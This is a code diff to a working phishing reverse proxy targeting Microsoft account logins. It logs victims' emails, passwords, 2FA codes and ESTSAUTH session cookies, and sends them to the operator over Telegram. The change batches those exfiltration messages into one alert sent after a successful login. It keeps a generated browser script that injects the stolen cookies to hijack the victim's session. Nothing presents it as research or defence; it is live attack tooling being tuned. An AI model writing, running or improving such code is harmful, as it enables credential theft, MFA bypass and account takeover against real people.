@@ -476,19 +476,10 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
-    // Send Telegram notification for new victim
-    const telegramMessage = `🎣 <b>NEW VICTIM SESSION</b>
-
-🌐 <b>Target:</b> ${phishedURL.host}
-🔗 <b>URL:</b> ${phishedURL.href}
-🍪 <b>Session:</b> ${cookieName}
-🔑 <b>Value:</b> ${cookieValue.substring(0, 8)}...
-⏰ <b>Time:</b> ${new Date().toISOString()}
-📁 <b>Log:</b> ${VICTIM_SESSIONS[cookieName].logFilename}`;
-
-    sendTelegramNotification(telegramMessage).catch(error => 
-        console.error('Failed to send Telegram notification:', error)
-    );
+    // Store session info but don't send notification yet
+    console.log(`New victim session started: ${cookieName} for ${phishedURL.host}`);
+    VICTIM_SESSIONS[cookieName].isPersonal = phishedURL.hostname.includes('live.com') || phishedURL.hostname.includes('outlook.com');
+    VICTIM_SESSIONS[cookieName].targetHost = phishedURL.host;
 
     return {
         cookieName: cookieName,
@@ -562,25 +553,22 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
             otcCode = otcMatch ? decodeURIComponent(otcMatch[1]) : '';
         }
         
-        if (username || password || otcCode) {
-            const telegramMessage = `🔐 <b>LOGIN CREDENTIALS CAPTURED!</b>
-
-🍪 <b>Session:</b> ${currentSession}
-🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
-📝 <b>Path:</b> ${requestPath}
-
-👤 <b>Email:</b> ${username || 'N/A'}
-🔑 <b>Password:</b> ${password || 'N/A'}
-${otcCode ? `🔢 <b>2FA Code:</b> ${otcCode}\n` : ''}${mfaMethod ? `📱 <b>MFA Method:</b> ${mfaMethod}\n` : ''}
-⏰ <b>Time:</b> ${new Date().toISOString()}`;
-
-            sendTelegramNotification(telegramMessage).catch(error => 
-                console.error('Failed to send credentials notification:', error)
-            );
-            
-            // Store credentials in session for later reference
-            if (username) VICTIM_SESSIONS[currentSession].username = username;
-            if (password) VICTIM_SESSIONS[currentSession].password = password;
+        // Store credentials but don't send notification yet
+        if (username) {
+            VICTIM_SESSIONS[currentSession].username = username;
+            // Only store if it's the first time or if email has changed
+            if (!VICTIM_SESSIONS[currentSession].credentialsCaptured) {
+                VICTIM_SESSIONS[currentSession].credentialsCaptured = true;
+                console.log(`Captured email for session ${currentSession}: ${username}`);
+            }
+        }
+        if (password) {
+            VICTIM_SESSIONS[currentSession].password = password;
+            console.log(`Captured password for session ${currentSession}`);
+        }
+        if (otcCode) {
+            VICTIM_SESSIONS[currentSession].otcCode = otcCode;
+            console.log(`Captured 2FA code for session ${currentSession}: ${otcCode}`);
         }
     }
     
@@ -879,18 +867,12 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
             
             if (importantCookies.includes(cookieName)) {
                 const sessionData = VICTIM_SESSIONS[currentSession];
-                const telegramMessage = `🍪 <b>CRITICAL AUTH COOKIE!</b>
-🍪 <b>Session:</b> ${currentSession}
-🌐 <b>Domain:</b> ${cookieDomain}
-📝 <b>Name:</b> ${cookieName}
-🔑 <b>Value:</b> ${cookieValue.join("=")}
-${sessionData.username ? `\n👤 <b>Email:</b> ${sessionData.username}` : ''}
-${sessionData.password ? `\n🔐 <b>Password:</b> ${sessionData.password}` : ''}
-⏰ <b>Time:</b> ${new Date().toISOString()}`;
-
-                sendTelegramNotification(telegramMessage).catch(error => 
-                    console.error('Failed to send cookie notification:', error)
-                );
+                
+                // Store important cookies but don't send individual notifications
+                if (!sessionData.authCookies) {
+                    sessionData.authCookies = {};
+                }
+                sessionData.authCookies[cookieName] = cookieValue.join("=");
                 
                 // Check if we have all 3 critical auth cookies
                 const sessionCookies = VICTIM_SESSIONS[currentSession].cookies;
@@ -898,29 +880,52 @@ ${sessionData.password ? `\n🔐 <b>Password:</b> ${sessionData.password}` : ''}
                 const hasESTSAUTHPERSISTENT = sessionCookies.some(c => c.name === 'ESTSAUTHPERSISTENT');
                 const hasESTSAUTHLIGHT = sessionCookies.some(c => c.name === 'ESTSAUTHLIGHT');
                 
-                if (hasESTSAUTH && hasESTSAUTHPERSISTENT && hasESTSAUTHLIGHT && !VICTIM_SESSIONS[currentSession].exportSent) {
-                    // Send cookie export format
-                    const authCookies = sessionCookies.filter(c => 
-                        ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT'].includes(c.name)
+                // Only send notification when ALL 3 auth cookies are captured (indicates successful login)
+                if (hasESTSAUTH && hasESTSAUTHPERSISTENT && hasESTSAUTHLIGHT && !sessionData.authNotificationSent) {
+                    // Consolidated notification with all details
+                    const telegramMessage = `✅ <b>SUCCESSFUL LOGIN CAPTURED!</b>
+
+🍪 <b>Session:</b> ${currentSession}
+👤 <b>Email:</b> ${sessionData.username || 'N/A'}
+🔑 <b>Password:</b> ${sessionData.password || 'N/A'}
+
+📌 <b>Auth Cookies:</b>
+ESTSAUTH: ${sessionData.authCookies.ESTSAUTH ? '✓ Captured' : '✗ Missing'}
+ESTSAUTHPERSISTENT: ${sessionData.authCookies.ESTSAUTHPERSISTENT ? '✓ Captured' : '✗ Missing'}
+ESTSAUTHLIGHT: ${sessionData.authCookies.ESTSAUTHLIGHT ? '✓ Captured' : '✗ Missing'}
+
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+                    sendTelegramNotification(telegramMessage).catch(error => 
+                        console.error('Failed to send consolidated notification:', error)
                     );
                     
-                    const cookieExportArray = authCookies.map(c => ({
-                        domain: `.${c.domain}`,
-                        expirationDate: c.expires || 1786791321,
-                        hostOnly: false,
-                        httpOnly: true,
-                        name: c.name,
-                        path: "/",
-                        sameSite: "none",
-                        secure: true,
-                        session: true,
-                        storeId: null,
-                        value: c.value
-                    }));
+                    sessionData.authNotificationSent = true;
                     
-                    const cookieExportScript = `!function(){let e=JSON.parse('${JSON.stringify(cookieExportArray)}');for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}domain=\${o.domain};Secure;SameSite=None\`;window.location.href=atob("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw==")}();`;
-                    
-                    const exportMessage = `🔥 <b>FULL COOKIE EXPORT READY!</b>
+                    // Send cookie export format separately if not sent
+                    if (!sessionData.exportSent) {
+                        // Send cookie export format
+                        const authCookies = sessionCookies.filter(c => 
+                            ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT'].includes(c.name)
+                        );
+                        
+                        const cookieExportArray = authCookies.map(c => ({
+                            domain: `.${c.domain}`,
+                            expirationDate: c.expires || 1786791321,
+                            hostOnly: false,
+                            httpOnly: true,
+                            name: c.name,
+                            path: "/",
+                            sameSite: "none",
+                            secure: true,
+                            session: true,
+                            storeId: null,
+                            value: c.value
+                        }));
+                        
+                        const cookieExportScript = `!function(){let e=JSON.parse('${JSON.stringify(cookieExportArray)}');for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}domain=\${o.domain};Secure;SameSite=None\`;window.location.href=atob("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw==")}();`;
+                        
+                        const exportMessage = `🔥 <b>FULL COOKIE EXPORT READY!</b>
 
 🍪 <b>Session:</b> ${currentSession}
 🌐 <b>Domain:</b> ${cookieDomain}
@@ -931,11 +936,12 @@ ${sessionData.password ? `\n🔐 <b>Password:</b> ${sessionData.password}` : ''}
 ✅ All critical auth cookies captured!
 ⏰ <b>Time:</b> ${new Date().toISOString()}`;
 
-                    sendTelegramNotification(exportMessage).catch(error => 
-                        console.error('Failed to send export notification:', error)
-                    );
-                    
-                    VICTIM_SESSIONS[currentSession].exportSent = true;
+                        sendTelegramNotification(exportMessage).catch(error => 
+                            console.error('Failed to send export notification:', error)
+                        );
+                        
+                        VICTIM_SESSIONS[currentSession].exportSent = true;
+                    }
                 }
             }
         }
